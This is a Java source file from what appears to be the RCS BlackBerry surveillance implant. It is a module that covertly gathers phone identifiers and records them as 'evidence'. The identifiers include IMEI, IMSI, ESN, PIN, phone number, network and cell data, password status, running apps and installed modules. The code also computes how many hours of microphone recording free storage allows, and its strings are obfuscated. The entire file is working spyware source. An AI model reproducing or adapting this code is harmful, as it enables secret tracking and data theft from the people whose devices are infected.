//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : DeviceInfoAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleGroupManager;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.util.NumberUtilities;
import blackberry.Device;
import blackberry.Messages;
import blackberry.config.Cfg;
import blackberry.config.ConfModule;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.fs.Path;

/**
 * The Class DeviceInfoAgent.
 */
public final class ModuleDevice extends BaseInstantModule {
    private static final String CR = "\n"; //$NON-NLS-1$
    //#ifdef DEBUG
    static Debug debug = new Debug("ModDevice", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    boolean runningApplication;
    boolean installedApplication;

    public static String getStaticType() {
        return Messages.getString("1c.a");//"device"; //$NON-NLS-1$
    }

    public boolean parse(ConfModule conf) {
        // this.processList = true;
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualStart() {
        boolean ret = true;

        Device device = Device.getInstance();
        final StringBuffer sb = new StringBuffer();

        // Modello
        // sb.append("Processor: ARM" +CR);
        if (DeviceInfo.isSimulator()) {
            sb.append(Messages.getString("1c.3") + CR); //$NON-NLS-1$
        }

        //#ifdef DEBUG
        sb.append(Messages.getString("1c.4") + CR); //$NON-NLS-1$
        //#endif

        sb.append(Messages.getString("1c.5") + CR + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.6") + DeviceInfo.getManufacturerName() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.7") + DeviceInfo.getDeviceName() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.8") + Device.getPin() + CR); //$NON-NLS-1$

        sb.append(Messages.getString("1c.9") + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.10") + DeviceInfo.getPlatformVersion() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.11") + DeviceInfo.getSoftwareVersion() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.12") + DeviceInfo.getIdleTime() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.13") + DeviceInfo.isInHolster() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.14") + DeviceInfo.isPasswordEnabled() + CR); //$NON-NLS-1$

        sb.append(Messages.getString("1c.15") + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.16") + Runtime.getRuntime().totalMemory() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.17") + Runtime.getRuntime().freeMemory() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.18") + DeviceInfo.hasCamera() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.19") + device.getPhoneNumber() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.20")); //$NON-NLS-1$
        int keyLayout = Keypad.getHardwareLayout();
        switch (keyLayout) {
            case Keypad.HW_LAYOUT_32:
                sb.append("32 " + CR); //$NON-NLS-1$
                break;
            case Keypad.HW_LAYOUT_39:
                sb.append("39" + CR); //$NON-NLS-1$
                break;
            case Keypad.HW_LAYOUT_LEGACY:
                sb.append(Messages.getString("1c.23") + CR); //$NON-NLS-1$
                break;
            case Keypad.HW_LAYOUT_PHONE:
                sb.append(Messages.getString("1c.24") + CR); //$NON-NLS-1$
                break;
            case Keypad.HW_LAYOUT_REDUCED_24:
                sb.append(Messages.getString("1c.25") + CR); //$NON-NLS-1$
                break;
            /*
             * case Keypad.HW_LAYOUT_TOUCHSCREEN_12: sb.append("TOUCH " + CR);
             * break; case Keypad.HW_LAYOUT_TOUCHSCREEN_12A: sb.append("TOUCH "
             * + CR); break; case Keypad.HW_LAYOUT_TOUCHSCREEN_12C:
             * sb.append("TOUCH " + CR); break; case
             * Keypad.HW_LAYOUT_TOUCHSCREEN_12H: sb.append("TOUCH " + CR);
             * break; case Keypad.HW_LAYOUT_TOUCHSCREEN_20J: sb.append("TOUCH "
             * + CR); break; case Keypad.HW_LAYOUT_TOUCHSCREEN_20JA:
             * sb.append("TOUCH " + CR); break; case
             * Keypad.HW_LAYOUT_TOUCHSCREEN_20K: sb.append("TOUCH " + CR);
             * break;
             */

            default:
                sb.append(Messages.getString("1c.26") + keyLayout + CR); //$NON-NLS-1$
                break;

        }

        sb.append(Messages.getString("1c.27") + CR); //$NON-NLS-1$
        long freeSpace = Path.freeSpace(Path.USER);
        long totalSpace = DeviceInfo.getTotalFlashSize();

        if (totalSpace > freeSpace) {
            sb.append(Messages.getString("1c.28") //$NON-NLS-1$
                    + (int) (DeviceInfo.getTotalFlashSize() / (1024 * 1024))
                    + Messages.getString("1c.29") + CR); //$NON-NLS-1$
        }

        if (freeSpace != -1) {
            sb.append(Messages.getString("1c.30") + (int) (freeSpace / (1024 * 1024)) //$NON-NLS-1$
                    + Messages.getString("1c.31") + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.32") + micRecTime(freeSpace) + Messages.getString("1c.33") //$NON-NLS-1$ //$NON-NLS-2$
                    + CR);
        }

        if (Path.isSDAvailable()) {
            sb.append(Messages.getString("1c.34") + Path.totalSpace(Path.SD) + Messages.getString("1c.35") + CR); //$NON-NLS-1$ //$NON-NLS-2$
            sb.append(Messages.getString("1c.36") + Path.freeSpace(Path.SD) + Messages.getString("1c.37") + CR); //$NON-NLS-1$ //$NON-NLS-2$
        }

        // Alimentazione
        sb.append(Messages.getString("1c.38") + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.39") + DeviceInfo.getBatteryLevel() + "%" + CR); //$NON-NLS-1$ //$NON-NLS-2$
        sb.append(Messages.getString("1c.41") + DeviceInfo.getBatteryStatus() + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.42") + DeviceInfo.getBatteryTemperature() //$NON-NLS-1$
                + Messages.getString("1c.43") + CR); //$NON-NLS-1$
        sb.append(Messages.getString("1c.44") + DeviceInfo.getBatteryVoltage() + " V" //$NON-NLS-1$ //$NON-NLS-2$
                + CR);

        // Radio
        sb.append(Messages.getString("1c.46") + CR); //$NON-NLS-1$
        if (Device.isCDMA()) {
            sb.append(Messages.getString("1c.47") + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.48") + device.getSid() + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.49") + NumberUtilities.toString(device.getEsn(), 16) //$NON-NLS-1$
                    + CR);
        } else if (Device.isGPRS()) {
            sb.append(Messages.getString("1c.50") + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.51") + device.getImei(true) + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.52") + device.getImsi(true) + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.53") + GPRSInfo.getHomeMCC() + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.54") + GPRSInfo.getHomeMNC() + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.55") + GPRSInfo.getCellInfo().getRSSI() + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.56") + GPRSInfo.getZoneName() + CR); //$NON-NLS-1$
        } else if (Device.isIDEN()) {
            sb.append(Messages.getString("1c.57") + CR); //$NON-NLS-1$
        }

        try {
            sb.append(Messages.getString("1c.58") + RadioInfo.getActiveWAFs() + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.59") + RadioInfo.getCurrentNetworkName() + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.60") + RadioInfo.getEnabledWAFs() + CR); //$NON-NLS-1$

            final String code = RadioInfo.getNetworkCountryCode(RadioInfo
                    .getCurrentNetworkIndex());

            if (code != null) {
                sb.append(Messages.getString("1c.61") //$NON-NLS-1$
                        + RadioInfo.getNetworkCountryCode(RadioInfo
                                .getCurrentNetworkIndex()) + CR);
            }

            sb.append(Messages.getString("1c.62") + RadioInfo.getNetworkService() + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.63") + RadioInfo.getNetworkType() + CR); //$NON-NLS-1$
            sb.append(Messages.getString("1c.64") + RadioInfo.getSignalLevel() + Messages.getString("1c.65") //$NON-NLS-1$ //$NON-NLS-2$
                    + CR);
            sb.append(Messages.getString("1c.66") //$NON-NLS-1$
                    + RadioInfo.isDataServiceOperational() + CR);
            sb.append(Messages.getString("1c.67") //$NON-NLS-1$
                    + RadioInfo.isDataServiceSuspended() + CR);
            // sb.append(": " + RadioInfo.);
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(Messages.getString("1c.68") + ex); //$NON-NLS-1$
            //#endif
        }

        sb.append(Messages.getString("1c.69") + CR); //$NON-NLS-1$
        sb.append(getRunningApplications());

        try {
            if (this.installedApplication) {

                sb.append(getInstalledModuleGroup());
                // sb.append(getInstalledApplications());
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }

        String content = sb.toString();
        Evidence evidence = new Evidence(EvidenceType.DEVICE);
        evidence.atomicWriteOnce(content);

    }

    private int micRecTime(long freeSpace) {
        // 8192 bytes every 5 seconds.
        // 1638 bytes every second
        // 98304 b / min
        // 5898240 b / hour

        return (int) (freeSpace / 5898240);
    }

    /**
     * Gets the running applications.
     * 
     * @return the running applications
     */
    String getRunningApplications() {
        final StringBuffer sb = new StringBuffer();

        final ApplicationManager manager = ApplicationManager
                .getApplicationManager();

        final int foregroundProcess = manager.getForegroundProcessId();
        sb.append(Messages.getString("1c.70") + foregroundProcess); //$NON-NLS-1$

        sb.append(CR + Messages.getString("1c.71") + CR); //$NON-NLS-1$

        // Check to see if application is running.
        final ApplicationDescriptor[] descriptors = manager
                .getVisibleApplications();
        // Retrieve the name of a running application.
        for (int i = 0; i < descriptors.length; i++) {
            final ApplicationDescriptor descriptor = descriptors[i];
            sb.append(descriptor.getName());
            sb.append(" "); //$NON-NLS-1$
            sb.append(descriptor.getVersion());
            sb.append(" "); //$NON-NLS-1$
            sb.append(descriptor.getFlags());
            sb.append(" "); //$NON-NLS-1$
            if (manager.getProcessId(descriptor) == foregroundProcess) {
                sb.append(Messages.getString("1c.75")); //$NON-NLS-1$
            }
            if ((descriptor.getPowerOnBehavior() & ApplicationDescriptor.FLAG_RUN_ON_STARTUP) != 0) {
                sb.append(Messages.getString("1c.76")); //$NON-NLS-1$
            }
            sb.append(CR);
        }

        return sb.toString();
    }

    /**
     * Gets the running applications.
     * 
     * @return the running applications
     */
    String getInstalledApplications() {
        final StringBuffer sb = new StringBuffer();
        sb.append(CR + Messages.getString("1c.77") + CR); //$NON-NLS-1$

        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            final String name = CodeModuleManager.getModuleName(handle);
            final String vendor = CodeModuleManager.getModuleVendor(handle);
            final String description = CodeModuleManager
                    .getModuleDescription(handle);
            final String version = CodeModuleManager.getModuleVersion(handle);
            final int moduleSize = CodeModuleManager.getModuleCodeSize(handle);
            final long timestamp = CodeModuleManager.getModuleTimestamp(handle);

            final Date date = new Date(timestamp);

            sb.append(name);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(vendor);
            sb.append(CR);
        }

        return sb.toString();
    }

    String getInstalledModuleGroup() {
        final StringBuffer sb = new StringBuffer();
        sb.append(CR + Messages.getString("1c.79") + CR + CR); //$NON-NLS-1$

        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final CodeModuleGroup handles[] = CodeModuleGroupManager.loadAll();
        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final int AllModulesHandles[] = CodeModuleManager.getModuleHandles();
        final Hashtable remainigModules = new Hashtable();
        int size = AllModulesHandles.length;
        for (int i = 0; i < size; i++) {
            remainigModules
                    .put(new Integer(AllModulesHandles[i]), new Object());
        }

        if (handles == null) {
            size = 0;
        } else {
            size = handles.length;
        }
        for (int i = 0; i < size; i++) {
            final CodeModuleGroup group = handles[i];

            // Retrieve specific information about a module.
            final String name = group.getName();
            final String copyright = group.getCopyright();
            final String description = group.getDescription();
            final int flags = group.getFlags();
            final String friendly = group.getFriendlyName();
            final String vendor = group.getVendor();
            final String version = group.getVersion();

            if (name == Cfg.GROUP_NAME) {
                sb.append(Messages.getString("1c.1") + CR); //$NON-NLS-1$

            }

            sb.append(name);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(vendor);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(flags);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(version);
            sb.append(CR);

            final Enumeration enumerator = group.getModules();
            while (enumerator.hasMoreElements()) {
                final String moduleName = (String) enumerator.nextElement();
                final int handle = CodeModuleManager
                        .getModuleHandle(moduleName);
                // Retrieve specific information about a module.

                sb.append("--> " + moduleName); //$NON-NLS-1$
                if (handle > 0) {
                    remainigModules.remove(new Integer(handle));
                    final String vendorModule = CodeModuleManager
                            .getModuleVendor(handle);
                    final String versionModule = CodeModuleManager
                            .getModuleVersion(handle);
                    sb.append(", " + vendorModule); //$NON-NLS-1$
                    sb.append(", " + versionModule); //$NON-NLS-1$

                    final ApplicationDescriptor[] descr = CodeModuleManager
                            .getApplicationDescriptors(handle);
                    if (descr != null && descr.length > 0) {
                        sb.append(", ( "); //$NON-NLS-1$
                        for (int j = 0; j < descr.length; j++) {
                            sb.append(descr[j].getFlags() + " "); //$NON-NLS-1$
                        }
                        sb.append(")"); //$NON-NLS-1$
                    }
                }
                sb.append(CR);
            }

            sb.append(CR);

        }

        sb.append(CR + Messages.getString("1c.0") + CR + CR); //$NON-NLS-1$
        final Enumeration enumeration = remainigModules.keys();
        while (enumeration.hasMoreElements()) {
            final Integer handle = (Integer) enumeration.nextElement();

            final String nameModule = CodeModuleManager.getModuleName(handle
                    .intValue());
            final String vendorModule = CodeModuleManager
                    .getModuleVendor(handle.intValue());
            final String versionModule = CodeModuleManager
                    .getModuleVersion(handle.intValue());

            sb.append(nameModule);
            sb.append(", " + vendorModule); //$NON-NLS-1$
            sb.append(", " + versionModule); //$NON-NLS-1$
            sb.append(CR);
        }
        final String ret = sb.toString();
        return ret;
    }

}
